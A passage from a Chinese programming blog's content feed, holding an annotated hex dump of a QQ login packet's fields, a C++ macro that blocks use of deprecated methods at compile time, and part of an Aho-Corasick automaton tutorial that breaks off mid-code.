c7 68 02</span><br><span class="line">0110   93 87 8f 69 36 f4 ce 31 0f 1f 86 e4 4d 39 13 c9</span><br><span class="line">0120   76 93 18 8f 97 28 00 7b 44 d1 f8 2e 7a 64 54 25</span><br><span class="line">0130   f6 66 7f 71 c8 41 1f 42 41 44 69 3c 03 4f 96 ed</span><br><span class="line">0140   31 7b 8e 89 f8 b8 87 5a b5 67 21 a1 d5 b6 f8 7d</span><br><span class="line">0150   ac 83 a2 be 45 9c 24 60 68 6a 88 ad 9d bd e2 f5</span><br><span class="line">0160   ed 6a 85 48 f3 ab 05 ee 3c 1e 86 a8 1c c8 11 59</span><br><span class="line">0170   6e 66 f1 d3 a2 6a 6f 5d 4a 80 66 2a 0b f0 08 27</span><br><span class="line">0180   a8 c4 98 37 dc 02 e7 0f d5 1b ab 40 8a d7 e3 a9</span><br><span class="line">0190   b8 07 90 5c fb d5 66 6b f6 06 e7 2f 7b a7 af 53</span><br><span class="line">01a0   42 4a b5 de c4 6e 02 94 81 2d 70 19 82 68 98 5f</span><br><span class="line">01b0   ae 1b 13 70 3c 28 e2 7c 88 d6 9a fa e9 1d 6d b9</span><br><span class="line">01c0   c4 a8 3c 55 8b a8 d8 ce 2a cc 3e 3f d4 d0 e9 83</span><br><span class="line">01d0   f8 0f 84 e2 d3 d3 17 2e a1 58 4f cf 15 f2 61 90</span><br><span class="line">01e0   a3 41 6d eb 76 93 4d ca bf ec 6e 19 d0 b0 d0 c7</span><br><span class="line">01f0   d1 e1 a3 73 50 b8 bc c9 d3 74 d1 ad 62 36 1b 70</span><br><span class="line">0200   bc 22 24 df c1 d3 9c 4d 94 ba 01 7f fd 7c 39 74</span><br><span class="line">0210   35 e1 88 ec e1 c2 82 98 95 d1 e0 ff 97 22 91 a8</span><br><span class="line">0220   3c 04 5a 4b f8 59 97 c6 62 df ed 3a 23 e7 57 21</span><br><span class="line">0230   17 43 f2 de 7b 0b a5 43 f9 3d 6c 9a 99 31 30 b3</span><br><span class="line">0240   38 74 6a 58 92 20 93 97 db e5 87 35 f4 9d 4c 10</span><br><span class="line">0250   fc 32 01 86 bb d0 61 40 e7 77 12 4e 0b a9 6a 2c</span><br><span class="line">0260   1d 64 bb de 0a f5 4b ee 2b 01 40 c7 20 b5 03 34</span><br><span class="line">0270   97 a8 63 22 4b 97 1f 90 59 85 c4 ea 41 16 58 de</span><br><span class="line">0280   fb d2 11 ae 53 90 62 79 45 8c 6f 56 82 bf c5 a7</span><br><span class="line">0290   7f 6e e8 90 8b 40 d7 2f 81 23 6d 40 f2 25 fe 63</span><br><span class="line">02a0   11 28 13 12 8c 2a 2b c5 d1 a3 99 76 6b 7e 76 7c</span><br><span class="line">02b0   09 8c 1c 3c e3 97 e3 b7 43 4c eb 39 96 cb 88 5b</span><br><span class="line">02c0   65 22 66 18 74 89 dd 42 8d ad 24 f5 71 05 f8 c1</span><br><span class="line">02d0   7c d3 4d 00 7c 57 ac ea 0a 0e 7a 6d 8a f4 bb 96</span><br><span class="line">02e0   cf 45 08 b3 d7 33 af 44 b7 39 c8 c9 97 32 3c f7</span><br><span class="line">02f0   90 9f 74 86 c0 41 15 d2 51 dc a4 fd e6 43 f1 0c</span><br><span class="line">0300   50 4e 99 ba 3a 58 ba 99 d8 a7 79 12 50 1c a5 6d</span><br><span class="line">0310   d6 bf ec 2b e6 9d 22 63 99 15 e9 38 7b b1 9b 6e</span><br><span class="line">0320   f8 ae 95 4b 24 aa df 75 0b 28 c8 72 7a da c8 ef</span><br><span class="line">0330   2b e1 25 ef 56 18 ad 42 78 0d 9a cb b3 3b 4f fd</span><br><span class="line">0340   19 64 90 e5 b5 31 a5 e8 d8 7c 84 e6 41 87 81 03</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="解析-2"><a href="#解析-2" class="headerlink" title="解析"></a>解析</h5><p>qq协议头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0020   .. .. .. .. .. .. .. .. .. .. 02 3a 57 08 36 61</span><br><span class="line">0030   48 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 00 02 01 03 00 19 .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><ul><li><code>02</code> qq协议指定前缀</li><li><code>3a 57</code> qq客户端版本</li><li><code>08 36</code> 二次登录命令</li><li><code>61 48</code> 该包序列号</li><li><code>73 17 17 b4</code> qq id hex</li><li><code>03 00 00</code> fixed const</li><li><code>00 01 01 01</code> client type</li><li><code>00 00 6a 4b</code> 发行编号</li><li><code>00 00 00 00 00</code> fixed const</li><li><code>02 01</code> 推测是subVer</li><li><code>03 00</code> 推测是echd ver</li><li><code>19</code> fixed const</li></ul><p>DhPublickey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040   .. .. .. .. .. .. .. .. .. .. 02 7b b7 5b fb ed</span><br><span class="line">0050   8d 28 d1 f1 bc ad 20 65 b2 4b dc 59 4a b8 a5 2f</span><br><span class="line">0060   60 d8 8a .. .. .. .. .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p>fixed const</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0060   .. .. .. 00 00 00 10 .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p>随机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0060   .. .. .. .. .. .. .. 66 76 2c 87 70 7c f5 de 93</span><br><span class="line">0070   d9 c7 e8 37 e8 e7 e6 .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p>密文<br>是用DhShareKey私钥加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0070   .. .. .. .. .. .. .. 88 3e be 9c d1 58 37 49 21</span><br><span class="line">0080   ef a7 d4 39 2e 33 ef 9a e0 96 59 88 25 7c e5 e3</span><br><span class="line">0090   b9 ae 9e 4d 31 c2 df ed 7e b5 b5 da 7d 86 3d e6</span><br><span class="line">00a0   3d f0 1b 5e 22 bf 8e 38 3c ff 4e d0 0b fe a9 76</span><br><span class="line">00b0   0c d8 de 7f 11 77 ef fc 1d 71 6c bd f7 75 e5 6e</span><br><span class="line">00c0   03 2a 04 dd 2f 24 44 fa 9a 60 7f 3f f2 bc b0 f3</span><br><span class="line">00d0   22 9a cc 2e 88 9d c5 eb 9a 7f 23 b5 81 b0 f3 9b</span><br><span class="line">00e0   60 ee d3 a1 04 23 3c 38 f6 73 6a 2a cd 7a 0c cf</span><br><span class="line">00f0   93 2f b0 0d e2 c6 17 18 c5 d8 1e c9 50 a2 be 76</span><br><span class="line">0100   76 eb 09 6d 84 48 41 98 b1 1b 7d eb 69 c7 68 02</span><br><span class="line">0110   93 87 8f 69 36 f4 ce 31 0f 1f 86 e4 4d 39 13 c9</span><br><span class="line">0120   76 93 18 8f 97 28 00 7b 44 d1 f8 2e 7a 64 54 25</span><br><span class="line">0130   f6 66 7f 71 c8 41 1f 42 41 44 69 3c 03 4f 96 ed</span><br><span class="line">0140   31 7b 8e 89 f8 b8 87 5a b5 67 21 a1 d5 b6 f8 7d</span><br><span class="line">0150   ac 83 a2 be 45 9c 24 60 68 6a 88 ad 9d bd e2 f5</span><br><span class="line">0160   ed 6a 85 48 f3 ab 05 ee 3c 1e 86 a8 1c c8 11 59</span><br><span class="line">0170   6e 66 f1 d3 a2 6a 6f 5d 4a 80 66 2a 0b f0 08 27</span><br><span class="line">0180   a8 c4 98 37 dc 02 e7 0f d5 1b ab 40 8a d7 e3 a9</span><br><span class="line">0190   b8 07 90 5c fb d5 66 6b f6 06 e7 2f 7b a7 af 53</span><br><span class="line">01a0   42 4a b5 de c4 6e 02 94 81 2d 70 19 82 68 98 5f</span><br><span class="line">01b0   ae 1b 13 70 3c 28 e2 7c 88 d6 9a fa e9 1d 6d b9</span><br><span class="line">01c0   c4 a8 3c 55 8b a8 d8 ce 2a cc 3e 3f d4 d0 e9 83</span><br><span class="line">01d0   f8 0f 84 e2 d3 d3 17 2e a1 58 4f cf 15 f2 61 90</span><br><span class="line">01e0   a3 41 6d eb 76 93 4d ca bf ec 6e 19 d0 b0 d0 c7</span><br><span class="line">01f0   d1 e1 a3 73 50 b8 bc c9 d3 74 d1 ad 62 36 1b 70</span><br><span class="line">0200   bc 22 24 df c1 d3 9c 4d 94 ba 01 7f fd 7c 39 74</span><br><span class="line">0210   35 e1 88 ec e1 c2 82 98 95 d1 e0 ff 97 22 91 a8</span><br><span class="line">0220   3c 04 5a 4b f8 59 97 c6 62 df ed 3a 23 e7 57 21</span><br><span class="line">0230   17 43 f2 de 7b 0b a5 43 f9 3d 6c 9a 99 31 30 b3</span><br><span class="line">0240   38 74 6a 58 92 20 93 97 db e5 87 35 f4 9d 4c 10</span><br><span class="line">0250   fc 32 01 86 bb d0 61 40 e7 77 12 4e 0b a9 6a 2c</span><br><span class="line">0260   1d 64 bb de 0a f5 4b ee 2b 01 40 c7 20 b5 03 34</span><br><span class="line">0270   97 a8 63 22 4b 97 1f 90 59 85 c4 ea 41 16 58 de</span><br><span class="line">0280   fb d2 11 ae 53 90 62 79 45 8c 6f 56 82 bf c5 a7</span><br><span class="line">0290   7f 6e e8 90 8b 40 d7 2f 81 23 6d 40 f2 25 fe 63</span><br><span class="line">02a0   11 28 13 12 8c 2a 2b c5 d1 a3 99 76 6b 7e 76 7c</span><br><span class="line">02b0   09 8c 1c 3c e3 97 e3 b7 43 4c eb 39 96 cb 88 5b</span><br><span class="line">02c0   65 22 66 18 74 89 dd 42 8d ad 24 f5 71 05 f8 c1</span><br><span class="line">02d0   7c d3 4d 00 7c 57 ac ea 0a 0e 7a 6d 8a f4 bb 96</span><br><span class="line">02e0   cf 45 08 b3 d7 33 af 44 b7 39 c8 c9 97 32 3c f7</span><br><span class="line">02f0   90 9f 74 86 c0 41 15 d2 51 dc a4 fd e6 43 f1 0c</span><br><span class="line">0300   50 4e 99 ba 3a 58 ba 99 d8 a7 79 12 50 1c a5 6d</span><br><span class="line">0310   d6 bf ec 2b e6 9d 22 63 99 15 e9 38 7b b1 9b 6e</span><br><span class="line">0320   f8 ae 95 4b 24 aa df 75 0b 28 c8 72 7a da c8 ef</span><br><span class="line">0330   2b e1 25 ef 56 18 ad 42 78 0d 9a cb b3 3b 4f fd</span><br><span class="line">0340   19 64 90 e5 b5 31 a5 e8 d8 7c 84 e6 41 87 81 ..</span><br></pre></td></tr></table></figure><p>固定结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0340   .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. 03</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Protocol </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 一种禁止方法被使用的宏</title>
      <link href="/2022/03/09/C++%E4%B8%80%E7%A7%8D%E7%A6%81%E6%AD%A2%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E8%A2%AB%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AE%8F/"/>
      <url>/2022/03/09/C++%E4%B8%80%E7%A7%8D%E7%A6%81%E6%AD%A2%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E8%A2%AB%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AE%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_VER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ShouldNotUse(msg) <span class="keyword">_Pragma</span>(<span class="string">&quot;warning(error:4996)&quot;</span>) [[deprecated(msg)]] <span class="keyword">_Pragma</span>(<span class="string">&quot;warning(warning:4996)&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__GNUC__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ShouldNotUse(msg) [[deprecated(msg)]] __attribute__((<span class="keyword">error</span>(msg)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ShouldNotUse(msg)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>所以如果使用被这个macro修饰的方法时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ShouldNotUse</span>(<span class="string">&quot;denied&quot;</span>) <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就会抛出编译期异常, 如果不调用就不会<br><a href="https://onlinegdb.com/cFYNQv9nF">playground</a></p><p>主要用于禁掉派生类里的成员方法(因为有继承, 所以不能直接<code>=delete</code>)</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aho-corasick automaton AC自动机的理解</title>
      <link href="/2022/01/11/aho-corasick-automaton-(AC%E8%87%AA%E5%8A%A8%E6%9C%BA)%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/11/aho-corasick-automaton-(AC%E8%87%AA%E5%8A%A8%E6%9C%BA)%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近在学编译原理, 里面在3.3节词法单元识别后面就提到了这个算法然后根据网上资料自己做了一遍，只支持英文字母<br>可能最后的效果没有<a href="https://oi-wiki.org/string/ac-automaton">oi-wiki</a>上的效率高</p></blockquote><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>大概涉及到的知识:</p><ul><li>Trie 树，一种字典树，可以看<a href="https://yuepenglei.github.io/2019/01/06/Trie/">这里</a>做的挺直观的</li><li>BFS 广度优先搜索Trie树</li><li>状态压缩，随便做的小优化，可能有负效果对于数据量小(x<br>主要思想就是用int&#x2F;long这种数据类型的每一位通过位运算当作bool而不是单独声明bool类型, 主要的算法就<ul><li><code>(n&gt;&gt;k)&amp;1</code>取出n的第k位的数据</li><li><code>n^(1&lt;&lt;k)</code> n的第k位取反</li></ul></li><li>AC自动机的失配(失效)算法</li></ul><h2 id="2-思想"><a href="#2-思想" class="headerlink" title="2. 思想"></a>2. 思想</h2><p>主要流程就, 先构造一棵trie树，然后用bfs构造每个节点的失配位置(最后效果就类似于DFA确定有限状态自动机)，然后再遍历以匹配出结果</p><h2 id="3-代码"><a href="#3-代码" class="headerlink" title="3. 代码"></a>3. 代码</h2><h3 id="3-1-Trie树"><a href="#3-1-Trie树" class="headerlink" title="3.1 Trie树"></a>3.1 Trie树</h3><p>比较简易的做法就是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">Node* next[<span class="number">26</span>];</span><br><span class="line"><span class="type">bool</span> end;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用数组的下标表示对应边(anscii, 比如 <code>char - &#39;a&#39;</code>)和对应的下一个节点<br>这里优化一下, 不然内存地址太分散然后其实这个数据结构不是很有必要<br>所以本文用一个<strong>二维数组</strong>代替这一套(<code>nodes[x][y]</code>x是节点的编号,y是<code>y+&#39;a&#39;</code>的边指向的节点 0&lt;&#x3D;y&lt;&#x3D;25, 比如a的边就是<code>&#39;a&#39;-&#39;a&#39;=0</code>), 具象化表示就<a href="https://oi-wiki.org/string/ac-automaton/#_5">参考oi-wiki</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> s = <span class="number">50</span>; </span><br><span class="line"><span class="type">int</span> nodes[s][<span class="number">26</span>]&#123;<span class="number">0</span>&#125;;  </span><br><span class="line"><span class="type">int</span> now = <span class="number">1</span>;</span><br><span class="line"><span class="type">bool</span> end[s];</span><br></pre></td></tr></table></figure><ul><li><code>s</code>是数组大小，因为后面状态压缩的时候还要用到就提取出来，作用和<code>#define</code>一样</li><li><code>end</code>是代表对应下标的节点是不是单词的结尾(判断匹配是否成功)</li><li><code>now</code>是下一个节点应该是哪个下标</li></ul><p>然后就是写<code>add()</code>或者<code>insert</code>方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// 插入单词</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// 当前插入到哪个节点, 一开始从根节点开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// 循环每个字符</span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// 如果没有对应的字符节点就新建一个</span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// 存入对应字符节点的下标</span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// 把目前插入到的节点指向到对应字符的子节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    end[p] = <span class="literal">true</span>; <span class="comment">// 单词结尾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-1-1-优化endNodes"><a href="#3-1-1-优化endNodes" class="headerlink" title="3.1.1 优化endNodes"></a>3.1.1 优化endNodes</h4><p>这里做了一个可有可无的优化, 就把代表end节点从一个bool数组改成一个int32_t数组, 然后用32位中每一位表示一个节点是否为接受节点(0或1)<br>为了使数据方便取余, 最好用2的整次方为数位长度(如8, 16, 32等)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> s = <span class="number">50</span>; </span><br><span class="line"><span class="type">int</span> nodes[s][<span class="number">26</span>]&#123;<span class="number">0</span>&#125;;  </span><br><span class="line"><span class="type">int</span> now = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> bitW = <span class="number">32</span>;                             <span class="comment">// 必须是2的n次方</span></span><br><span class="line"><span class="type">int32_t</span> endNodes[s / bitW + (s % bitW &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)]&#123;<span class="number">0</span>&#125;; <span class="comment">// 该下标对应的节点是否为单词的结尾</span></span><br></pre></td></tr></table></figure><p>所以上面的声明代码就变成这样, 和add方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// 插入单词</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// 当前插入到哪个节点, 一开始从根节点开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// 循环每个字符</span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// 如果没有对应的字符节点就新建一个</span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// 存入对应字符节点的下标</span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// 把目前插入到的节点指向到对应字符的子节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    endNodes[p / bitW] = endNodes[p / bitW] ^ (<span class="number">1</span> &lt;&lt; (p &amp; (bitW - <span class="number">1</span>))); <span class="comment">// 表明该节点是单词的结尾, endNodes[p/bitW]^(1&lt;&lt;n)是对n位取反, 后面的p&amp;63为:当取余的除数为2^n时,可以用p&amp;(k-1)代替,也就是p&amp;63</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后当要去第p个节点是否是接受(结束)节点时:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) </span><br></pre></td></tr></table></figure><h3 id="3-2-失配算法"><a href="#3-2-失配算法" class="headerlink" title="3.2 失配算法"></a>3.2 失配算法</h3><p>主要就先准备一个fail数组(在这里我设立的是从1开始, 就不用提前赋值全部元素为-1, 因为元素可以是0), 下标代表对应的节点失配后跳转到哪个节点<br>然后用一个队列(queue)确保BFS因为先入先出<br>然后就循环每一个节点和子节点找失配位置<br>具体流程:<br>先从根节点开始 -&gt; 依循bfs也就是宽度(广度)优先顺序搜索每个子节点-&gt;先遍历每个子节点的每条边-&gt;当边不为空(指向的子节点!&#x3D;0, 因为边是不可能指向根节点), 对于每个子节点的边有3种情况:</p><ul><li>如果父节点是0也就是根节点, 那当前边指向的子节点的失配位置就是根节点也就是0</li><li>如果父节点是失配位置有当前边, 那当前边指向的子节点的失配位置就是父节点的失配位置</li><li>如果以上都不是, 把父节点的失配位置看作这条边的父节点然后继续上面的流程知道父节点是根节点</li></ul><p>执行上面的流程找到失配位置后把当前边对应的子节点压入队列然后开始下一条边</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fail[s]&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieFail</span><span class="params">()</span> </span>&#123;                                   <span class="comment">// 失配跳转配置</span></span><br><span class="line">    <span class="type">int</span> n;                                          <span class="comment">// now, 也就是当前节点的下标</span></span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; ns;                                  <span class="comment">// 待处理的节点下标</span></span><br><span class="line">    ns.<span class="built_in">push</span>(<span class="number">0</span>);                                     <span class="comment">// 一开始从根节点开始</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ns.<span class="built_in">empty</span>()) <span class="keyword">break</span>; <span class="comment">// 如果没有待处理的就推出</span></span><br><span class="line">        n = ns.<span class="built_in">front</span>();          <span class="comment">// 取出最上面待处理的并弹出</span></span><br><span class="line">        ns.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123; <span class="comment">// 循环该节点下全部子节点</span></span><br><span class="line">            <span class="keyword">if</span> (nodes[n][i] != <span class="number">0</span>) &#123;</span><br><span class="line">                &#123;                         <span class="comment">// 求失配跳转位置</span></span><br><span class="line">                    <span class="type">int</span> pp = n;           <span class="comment">// 父节点, 因为遍历的是当前节点的子节点, 所以父节点就是当前节点</span></span><br><span class="line">                    <span class="type">int</span> nn = nodes[n][i]; <span class="comment">// 当前节点, 也就是遍历的子节点</span></span><br><span class="line">                    <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123;        <span class="comment">// 如果父节点是根节点, 那失配节点就是根节点</span></span><br><span class="line">                        fail[nn] = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span></span><br><span class="line">                        <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 不断循环父节点的失配位置, 或者父节点的失配位置的失配位置直到到根节点或者找到合适的</span></span><br><span class="line">                            <span class="keyword">if</span> (fail[pp] != <span class="number">0</span>) pp = fail[pp] - <span class="number">1</span>; <span class="comment">// 如果父节点有失配位置, 就把父节点的失配位置视为父节点</span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">throw</span> <span class="built_in">invalid_argument</span>(<span class="built_in">to_string</span>(nn) + <span class="string">&quot;-&quot;</span> + <span class="built_in">to_string</span>(pp) + <span class="string">&quot;x&quot;</span>); <span class="comment">// unreachable</span></span><br><span class="line">                            <span class="keyword">if</span> (nodes[pp][i] != <span class="number">0</span>) &#123;                                               <span class="comment">// 如果该节点(父节点的某个失配位置)有i的边, 失配位置就是那个边指向的节点</span></span><br><span class="line">                                fail[nn] = nodes[pp][i] + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123; <span class="comment">// 如果父节点是根节点, 那失配节点就直接是根节点</span></span><br><span class="line">                                fail[nn] = <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ns.<span class="built_in">push</span>(nodes[n][i]); <span class="comment">// 把该节点列入待处理队列</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-寻找"><a href="#3-3-寻找" class="headerlink" title="3.3 寻找"></a>3.3 寻找</h3><p>就循环每条边, 如果匹配不上就移动到失配节点继续</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;string&gt; <span class="title">trieFind</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123; <span class="comment">// 查找一个单词</span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                                     <span 